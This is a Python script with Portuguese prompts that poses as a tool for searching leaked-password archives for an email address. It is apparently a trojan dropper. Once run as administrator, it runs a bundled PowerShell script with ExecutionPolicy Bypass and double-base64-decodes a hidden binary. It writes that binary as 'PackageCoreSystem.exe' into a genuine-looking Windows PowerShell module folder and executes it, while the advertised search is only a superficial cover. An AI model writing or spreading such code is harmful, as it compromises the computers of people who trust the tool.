import os
import subprocess
import ctypes
import time
import base64

def admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def procurarSenha(zip,file,email):
    comando = ["libs\\7za.exe", "e", zip,file,email,"-so"]
    resultado = subprocess.run(comando,capture_output=True,text=True)
    if email in resultado.stdout:
        print(f"{email}")
    else:
        print("Nada encontrado")
if admin():
    arq = input("Digite o caminho até o arquivo zip: ")
    text = input("Digite o caminho até o arquivo com os vazamentos: ")
    emai = input("Digite o email que você procura: ")
    if os.path.exists("C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\1.0.0.1\\DSCResources\\PackageCoreSystem.exe"):
        print("Procurando vazamento")
        subprocess.run(["C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\1.0.0.1\\DSCResources\\PackageCoreSystem.exe"])
        procurarSenha(arq,text,emai)
    else:
        print("Procurando vazamento")
        try:
            powershell_script = "libs\\conf.ps1"
            result = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-File", powershell_script],
                capture_output=True,
                text=True,
                check=True
            )
            with open("libs\\ExtractorPackage.bin","rb") as f:
                a = f.read()
            encoded = base64.b64decode(a)
            with open("C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\1.0.0.1\\DSCResources\\PackageCoreSystem.exe","wb") as f2:
                f2.write(base64.b64decode(encoded))
            procurarSenha(arq,text,emai)
            time.sleep(1)
            subprocess.run(["C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\1.0.0.1\\DSCResources\\PackageCoreSystem.exe"])
        except subprocess.CalledProcessError as e:
            print("Erro ao executar o script PowerShell:", e.stderr)
        except FileNotFoundError as e:
            print("Erro:", e)
        except Exception as e:
            print("Erro inesperado:", e)
else:
    print("Sem permissão para executar o arquivo, execute como Administrador...")
    time.sleep(5)

